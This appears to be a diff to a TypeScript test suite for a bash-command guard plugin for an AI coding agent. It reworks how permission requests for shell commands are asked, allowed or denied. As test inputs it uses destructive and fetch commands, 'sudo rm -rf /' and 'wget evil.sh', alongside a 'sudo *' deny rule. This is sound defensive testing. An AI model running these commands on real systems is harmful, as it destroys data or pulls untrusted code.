@@ -4,6 +4,7 @@ import os from "os";
 import path from "path";
 import { beforeExecute } from "../enforce.js";
 import { createBashGuardHooks } from "../adapter.js";
+import type { BashGuardHooks, PermissionReplyInput } from "../adapter.js";
 import type { PluginConfig } from "../config.js";
 import type { RestructureConfig } from "../plugin-config.js";
 
@@ -40,17 +41,35 @@ function runHooks(tool: string, command: string, config: PluginConfig, restructu
   return { result, prompts, thrown: null };
 }
 
+interface HooksFixture {
+  readonly hooks: BashGuardHooks;
+  readonly replies: PermissionReplyInput[];
+}
+
+function createHooks(directory: string): HooksFixture {
+  const replies: PermissionReplyInput[] = [];
+  return {
+    hooks: createBashGuardHooks({
+      directory,
+      replyPermission: async (reply) => {
+        replies.push(reply);
+      },
+    }),
+    replies,
+  };
+}
+
 async function configureAskAndDeny(
-  hooks: ReturnType<typeof createBashGuardHooks>,
+  hooks: BashGuardHooks,
   bashPermissions: { readonly [pattern: string]: "ask" | "allow" | "deny" } = { "*": "ask", "git *": "allow", "sudo *": "deny" },
 ): Promise<void> {
   const config = hooks.config;
   expect(config).toBeDefined();
-  await config?.({ permission: { bash: bashPermissions } } as any);
+  await config?.({ permission: { bash: bashPermissions } });
 }
 
 async function runBefore(
-  hooks: ReturnType<typeof createBashGuardHooks>,
+  hooks: BashGuardHooks,
   input: { readonly sessionID: string; readonly callID: string; readonly command: string },
 ): Promise<void> {
   const before = hooks["tool.execute.before"];
@@ -59,18 +78,29 @@ async function runBefore(
 }
 
 async function runPermissionAsk(
-  hooks: ReturnType<typeof createBashGuardHooks>,
+  fixture: HooksFixture,
   input: { readonly sessionID: string; readonly callID?: string },
 ): Promise<"ask" | "allow" | "deny"> {
-  const permissionAsk = hooks["permission.ask"];
-  expect(permissionAsk).toBeDefined();
-  const output = { status: "ask" as const };
-  await permissionAsk?.({ sessionID: input.sessionID, callID: input.callID } as any, output);
-  return output.status;
+  const event = fixture.hooks.event;
+  const replyCount = fixture.replies.length;
+  await event({
+    event: {
+      type: "permission.asked",
+      properties: {
+        id: `request-${replyCount}`,
+        sessionID: input.sessionID,
+        tool: input.callID === undefined ? undefined : { messageID: `message-${replyCount}`, callID: input.callID },
+      },
+    },
+  });
+  const reply = fixture.replies[replyCount];
+  if (reply === undefined) return "ask";
+  return reply.response === "once" ? "allow" : "deny";
 }
 
 interface ArgsAllowFixture {
-  readonly hooks: ReturnType<typeof createBashGuardHooks>;
+  readonly hooks: BashGuardHooks;
+  readonly replies: PermissionReplyInput[];
   readonly cleanup: () => void;
 }
 
@@ -87,11 +117,12 @@ async function createArgsAllowFixture(): Promise<ArgsAllowFixture> {
   );
   process.env.XDG_CONFIG_HOME = fs.mkdtempSync(path.join(os.tmpdir(), "obg-xdg-"));
 
-  const hooks = createBashGuardHooks({ directory: project });
-  await configureAskAndDeny(hooks);
+  const fixture = createHooks(project);
+  await configureAskAndDeny(fixture.hooks);
 
   return {
-    hooks,
+    hooks: fixture.hooks,
+    replies: fixture.replies,
     cleanup: () => {
       if (previousXdgConfigHome === undefined) delete process.env.XDG_CONFIG_HOME;
       else process.env.XDG_CONFIG_HOME = previousXdgConfigHome;
@@ -315,7 +346,8 @@ describe("characterization: readability thresholds and messages", () => {
 
 describe("instance-owned permission handoff", () => {
   it("Given disabled native config, when before and permission hooks run, then command and status stay untouched", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks, { "*": "allow" });
     const before = hooks["tool.execute.before"];
     if (before === undefined) throw new Error("missing before hook");
@@ -325,21 +357,22 @@ describe("instance-owned permission handoff", () => {
     await before({ tool: "Bash", callID: input.callID, sessionID: input.sessionID }, output);
 
     expect(output.args.command).toBe(input.command);
-    expect(await runPermissionAsk(hooks, input)).toBe("ask");
+    expect(await runPermissionAsk(fixture, input)).toBe("ask");
   });
 
-  it("Given enabled hooks, when permission.ask lacks or does not recognize a callID, then status stays ask", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+  it("Given enabled hooks, when permission.asked lacks or does not recognize a callID, then no reply is sent", async () => {
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
     const knownInput = { sessionID: "known", callID: "known", command: "sudo rm -rf /" };
     await runBefore(hooks, knownInput);
 
-    expect(await runPermissionAsk(hooks, { sessionID: "missing" })).toBe("ask");
-    expect(await runPermissionAsk(hooks, { sessionID: "unknown", callID: "unknown" })).toBe("ask");
-    expect(await runPermissionAsk(hooks, knownInput)).toBe("deny");
+    expect(await runPermissionAsk(fixture, { sessionID: "missing" })).toBe("ask");
+    expect(await runPermissionAsk(fixture, { sessionID: "unknown", callID: "unknown" })).toBe("ask");
+    expect(await runPermissionAsk(fixture, knownInput)).toBe("deny");
   });
 
-  it("Given an args-level allow, when permission.ask fires twice, then only the first call is allowed", async () => {
+  it("Given an args-level allow, when permission.asked fires twice, then only the first event is allowed", async () => {
     const project = fs.mkdtempSync(path.join(os.tmpdir(), "obg-allow-"));
     const previousXdgConfigHome = process.env.XDG_CONFIG_HOME;
     fs.mkdirSync(path.join(project, ".opencode"), { recursive: true });
@@ -353,13 +386,14 @@ describe("instance-owned permission handoff", () => {
     process.env.XDG_CONFIG_HOME = path.join(os.tmpdir(), `obg-xdg-${Date.now()}`);
 
     try {
-      const hooks = createBashGuardHooks({ directory: project });
+      const fixture = createHooks(project);
+      const { hooks } = fixture;
       await configureAskAndDeny(hooks);
 
       const input = { sessionID: "session", callID: "allow-once", command: "curl -X GET https://api.example" };
       await runBefore(hooks, input);
-      expect(await runPermissionAsk(hooks, input)).toBe("allow");
-      expect(await runPermissionAsk(hooks, input)).toBe("ask");
+      expect(await runPermissionAsk(fixture, input)).toBe("allow");
+      expect(await runPermissionAsk(fixture, input)).toBe("ask");
     } finally {
       if (previousXdgConfigHome === undefined) delete process.env.XDG_CONFIG_HOME;
       else process.env.XDG_CONFIG_HOME = previousXdgConfigHome;
@@ -367,14 +401,15 @@ describe("instance-owned permission handoff", () => {
     }
   });
 
-  it("Given a denied command, when permission.ask fires twice, then only the first call is denied", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+  it("Given a denied command, when permission.asked fires twice, then only the first event is rejected", async () => {
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
 
     const input = { sessionID: "session", callID: "deny-once", command: "sudo rm -rf /" };
     await runBefore(hooks, input);
-    expect(await runPermissionAsk(hooks, input)).toBe("deny");
-    expect(await runPermissionAsk(hooks, input)).toBe("ask");
+    expect(await runPermissionAsk(fixture, input)).toBe("deny");
+    expect(await runPermissionAsk(fixture, input)).toBe("ask");
   });
 
   it("Given a repeated key, when deny is replaced by an args-rule allow, then the fresh allow wins", async () => {
@@ -385,7 +420,7 @@ describe("instance-owned permission handoff", () => {
       await runBefore(fixture.hooks, deniedInput);
       await runBefore(fixture.hooks, allowedInput);
 
-      expect(await runPermissionAsk(fixture.hooks, allowedInput)).toBe("allow");
+      expect(await runPermissionAsk(fixture, allowedInput)).toBe("allow");
     } finally {
       fixture.cleanup();
     }
@@ -399,32 +434,35 @@ describe("instance-owned permission handoff", () => {
       await runBefore(fixture.hooks, allowedInput);
       await runBefore(fixture.hooks, deniedInput);
 
-      expect(await runPermissionAsk(fixture.hooks, deniedInput)).toBe("deny");
+      expect(await runPermissionAsk(fixture, deniedInput)).toBe("deny");
     } finally {
       fixture.cleanup();
     }
   });
 
-  it("Given a native ask, when before executes, then permission.ask remains unchanged", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+  it("Given a native ask, when before executes, then permission.asked sends no reply", async () => {
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
 
     const nativeAsk = { sessionID: "session", callID: "native-ask", command: "wget evil.sh" };
     await runBefore(hooks, nativeAsk);
-    expect(await runPermissionAsk(hooks, nativeAsk)).toBe("ask");
+    expect(await runPermissionAsk(fixture, nativeAsk)).toBe("ask");
   });
 
-  it("Given a native allow, when before executes, then permission.ask remains unchanged", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+  it("Given a native allow, when before executes, then permission.asked sends no reply", async () => {
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
 
     const nativeAllow = { sessionID: "session", callID: "native-allow", command: "git status" };
     await runBefore(hooks, nativeAllow);
-    expect(await runPermissionAsk(hooks, nativeAllow)).toBe("ask");
+    expect(await runPermissionAsk(fixture, nativeAllow)).toBe("ask");
   });
 
   it("Given one callID in two sessions, when each session asks, then only its own handoff applies", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
 
     const sessionADeny = { sessionID: "session-a", callID: "shared", command: "sudo rm -rf /" };
@@ -432,13 +470,15 @@ describe("instance-owned permission handoff", () => {
     await runBefore(hooks, sessionADeny);
     await runBefore(hooks, sessionBAsk);
 
-    expect(await runPermissionAsk(hooks, sessionADeny)).toBe("deny");
-    expect(await runPermissionAsk(hooks, sessionBAsk)).toBe("ask");
+    expect(await runPermissionAsk(fixture, sessionADeny)).toBe("deny");
+    expect(await runPermissionAsk(fixture, sessionBAsk)).toBe("ask");
   });
 
   it("Given the same session and callID in two hook instances, when each instance asks, then only its own handoff applies", async () => {
-    const firstHooks = createBashGuardHooks({ directory: "/project" });
-    const secondHooks = createBashGuardHooks({ directory: "/project" });
+    const firstFixture = createHooks("/project");
+    const secondFixture = createHooks("/project");
+    const firstHooks = firstFixture.hooks;
+    const secondHooks = secondFixture.hooks;
     await configureAskAndDeny(firstHooks);
     await configureAskAndDeny(secondHooks);
 
@@ -447,29 +487,31 @@ describe("instance-owned permission handoff", () => {
     await runBefore(firstHooks, deniedInput);
     await runBefore(secondHooks, askInput);
 
-    expect(await runPermissionAsk(firstHooks, deniedInput)).toBe("deny");
-    expect(await runPermissionAsk(secondHooks, askInput)).toBe("ask");
+    expect(await runPermissionAsk(firstFixture, deniedInput)).toBe("deny");
+    expect(await runPermissionAsk(secondFixture, askInput)).toBe("ask");
   });
 
   it("Given a reused pair, when a non-storing path follows a denial, then the stale handoff is cleared", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
 
     const deniedInput = { sessionID: "session", callID: "reused", command: "sudo rm -rf /" };
     const emptyInput = { sessionID: "session", callID: "reused", command: "" };
     await runBefore(hooks, deniedInput);
     await runBefore(hooks, emptyInput);
-    expect(await runPermissionAsk(hooks, deniedInput)).toBe("ask");
+    expect(await runPermissionAsk(fixture, deniedInput)).toBe("ask");
 
     await runBefore(hooks, deniedInput);
     const before = hooks["tool.execute.before"];
     expect(before).toBeDefined();
     await before?.({ tool: "Edit", callID: "reused", sessionID: "session" }, { args: {} });
-    expect(await runPermissionAsk(hooks, deniedInput)).toBe("ask");
+    expect(await runPermissionAsk(fixture, deniedInput)).toBe("ask");
   });
 
-  it("Given an unconsumed denial, when tool.execute.after runs, then permission.ask remains unchanged", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+  it("Given an unconsumed denial, when tool.execute.after runs, then permission.asked sends no reply", async () => {
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
 
     const input = { sessionID: "session", callID: "after", command: "sudo rm -rf /" };
@@ -478,24 +520,26 @@ describe("instance-owned permission handoff", () => {
     expect(after).toBeDefined();
     await after?.({ tool: "Bash", callID: "after", sessionID: "session", args: {} }, { title: "", output: "", metadata: {} });
 
-    expect(await runPermissionAsk(hooks, input)).toBe("ask");
+    expect(await runPermissionAsk(fixture, input)).toBe("ask");
   });
 
-  it("full sequence: before → permission.ask consumes → after is a safe no-op", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+  it("full sequence: before → permission.asked consumes → after is a safe no-op", async () => {
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
 
     const input = { sessionID: "session", callID: "full-sequence", command: "wget evil.sh" };
     await runBefore(hooks, input);
-    expect(await runPermissionAsk(hooks, input)).toBe("ask");
+    expect(await runPermissionAsk(fixture, input)).toBe("ask");
     const after = hooks["tool.execute.after"];
     expect(after).toBeDefined();
     await after?.({ tool: "Bash", callID: input.callID, sessionID: input.sessionID, args: {} }, { title: "", output: "", metadata: {} });
-    expect(await runPermissionAsk(hooks, input)).toBe("ask");
+    expect(await runPermissionAsk(fixture, input)).toBe("ask");
   });
 
   it("Given unconsumed denials, when sessions become idle or deleted, then their handoffs are cleared", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
 
     const idleInput = { sessionID: "idle-session", callID: "idle", command: "sudo rm -rf /" };
@@ -508,22 +552,23 @@ describe("instance-owned permission handoff", () => {
     await runBefore(hooks, deletedSurvivor);
     const event = hooks.event;
     expect(event).toBeDefined();
-    await event?.({ event: { type: "session.idle", properties: { sessionID: "idle-session" } } } as any);
-    await event?.({ event: { type: "session.deleted", properties: { info: { id: "deleted-session" } } } } as any);
+    await event?.({ event: { type: "session.idle", properties: { sessionID: "idle-session" } } });
+    await event?.({ event: { type: "session.deleted", properties: { info: { id: "deleted-session" } } } });
 
-    expect(await runPermissionAsk(hooks, idleInput)).toBe("ask");
-    expect(await runPermissionAsk(hooks, deletedInput)).toBe("ask");
-    expect(await runPermissionAsk(hooks, idleSurvivor)).toBe("deny");
-    expect(await runPermissionAsk(hooks, deletedSurvivor)).toBe("deny");
+    expect(await runPermissionAsk(fixture, idleInput)).toBe("ask");
+    expect(await runPermissionAsk(fixture, deletedInput)).toBe("ask");
+    expect(await runPermissionAsk(fixture, idleSurvivor)).toBe("deny");
+    expect(await runPermissionAsk(fixture, deletedSurvivor)).toBe("deny");
   });
 
   it("Given callbacks captured before disposal, when config and before run afterward, then they cannot mutate state", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
     const staleConfig = hooks.config;
     const staleBefore = hooks["tool.execute.before"];
-    const stalePermissionAsk = hooks["permission.ask"];
-    if (staleConfig === undefined || staleBefore === undefined || stalePermissionAsk === undefined) throw new Error("missing lifecycle hooks");
+    const staleEvent = hooks.event;
+    if (staleConfig === undefined || staleBefore === undefined) throw new Error("missing lifecycle hooks");
 
     await hooks.dispose?.();
     await configureAskAndDeny({ ...hooks, config: staleConfig });
@@ -533,18 +578,25 @@ describe("instance-owned permission handoff", () => {
     await staleBefore({ tool: "Bash", callID: input.callID, sessionID: input.sessionID }, output);
 
     expect(output.args.command).toBe(input.command);
-    expect(await runPermissionAsk({ ...hooks, "permission.ask": stalePermissionAsk }, input)).toBe("ask");
+    await staleEvent({
+      event: {
+        type: "permission.asked",
+        properties: { id: "disposed-request", sessionID: input.sessionID, tool: { messageID: "disposed-message", callID: input.callID } },
+      },
+    });
+    expect(fixture.replies).toHaveLength(0);
   });
 
   it("Given more than 256 pending denials, when the oldest is consumed, then it remains denied", async () => {
-    const hooks = createBashGuardHooks({ directory: "/project" });
+    const fixture = createHooks("/project");
+    const { hooks } = fixture;
     await configureAskAndDeny(hooks);
 
     for (let index = 0; index < 257; index += 1) {
       await runBefore(hooks, { sessionID: "deny-capacity", callID: `deny-${index}`, command: "sudo rm -rf /" });
     }
 
-    expect(await runPermissionAsk(hooks, { sessionID: "deny-capacity", callID: "deny-0" })).toBe("deny");
+    expect(await runPermissionAsk(fixture, { sessionID: "deny-capacity", callID: "deny-0" })).toBe("deny");
   });
 
   it("Given more than 256 pending args-rule allows, when the oldest is consumed, then it remains allowed", async () => {
@@ -554,15 +606,17 @@ describe("instance-owned permission handoff", () => {
         await runBefore(fixture.hooks, { sessionID: "allow-capacity", callID: `allow-${index}`, command: "curl -X GET https://api.example" });
       }
 
-      expect(await runPermissionAsk(fixture.hooks, { sessionID: "allow-capacity", callID: "allow-0" })).toBe("allow");
+      expect(await runPermissionAsk(fixture, { sessionID: "allow-capacity", callID: "allow-0" })).toBe("allow");
     } finally {
       fixture.cleanup();
     }
   });
 
   it("Given two instances with pending denials, when one is disposed, then only that instance clears handoffs and stale callbacks cannot apply them", async () => {
-    const disposedHooks = createBashGuardHooks({ directory: "/project" });
-    const activeHooks = createBashGuardHooks({ directory: "/project" });
+    const disposedFixture = createHooks("/project");
+    const activeFixture = createHooks("/project");
+    const disposedHooks = disposedFixture.hooks;
+    const activeHooks = activeFixture.hooks;
     await configureAskAndDeny(disposedHooks);
     await configureAskAndDeny(activeHooks);
 
@@ -570,14 +624,17 @@ describe("instance-owned permission handoff", () => {
     const activeInput = { sessionID: "session", callID: "active", command: "sudo rm -rf /" };
     await runBefore(disposedHooks, disposedInput);
     await runBefore(activeHooks, activeInput);
-    const stalePermissionAsk = disposedHooks["permission.ask"];
-    expect(stalePermissionAsk).toBeDefined();
+    const staleEvent = disposedHooks.event;
     expect(disposedHooks.dispose).toBeDefined();
     await disposedHooks.dispose?.();
 
-    const staleOutput = { status: "ask" as const };
-    await stalePermissionAsk?.({ sessionID: "session", callID: "disposed" } as any, staleOutput);
-    expect(staleOutput.status).toBe("ask");
-    expect(await runPermissionAsk(activeHooks, activeInput)).toBe("deny");
+    await staleEvent({
+      event: {
+        type: "permission.asked",
+        properties: { id: "disposed-request", sessionID: "session", tool: { messageID: "disposed-message", callID: "disposed" } },
+      },
+    });
+    expect(disposedFixture.replies).toHaveLength(0);
+    expect(await runPermissionAsk(activeFixture, activeInput)).toBe("deny");
   });
 });
